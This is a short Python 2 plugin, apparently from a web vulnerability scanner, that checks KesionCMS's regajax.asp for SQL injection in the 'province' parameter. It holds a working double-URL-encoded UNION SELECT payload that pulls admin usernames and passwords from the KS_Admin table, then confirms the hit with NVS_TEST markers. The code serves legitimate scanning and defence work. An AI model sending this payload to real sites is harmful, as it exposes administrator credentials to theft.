#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
import re
def run_domain(http,ob):
    try:  
        result=[]                               
        detail=u'漏洞文件‘regajax.asp’，没有对参数‘province’进行处理就直接带入到SQL语句去查询导致产生SQL注入漏洞。\n'
        detail=detail.encode('utf8')
        domain=ob['domain']
        url="user/reg/regajax.asp?action=getcityoption&province=goingta%2527%2520union%2520%2573%2565%256C%2565%2563%2574%25201,%2527NVS_TEST%2527%252Busername%252B%2527NVS_TEST%2527%252Bpassword%252B%2527NVS_TEST%2527%2520from%2520KS_Admin%2500"
        geturl="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url)        
        response,content=requestUrl(http,geturl,ob['task_id'],ob['domain_id'])
        try:
            content=content.decode('gb2312').encode('utf8')
        except UnicodeDecodeError:
            return result
        if content.find("NVS_TEST")>=0 and content.find("</option>")>=0:
            request = getRequest(geturl)
            response = getResponse(response)
            result.append(getRecord(ob,ob['scheme']+"://"+domain,ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:kesionCMSsqlINJECTION1.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:kesionCMSsqlINJECTION1.py, run_domain function :" + str(e))
    return result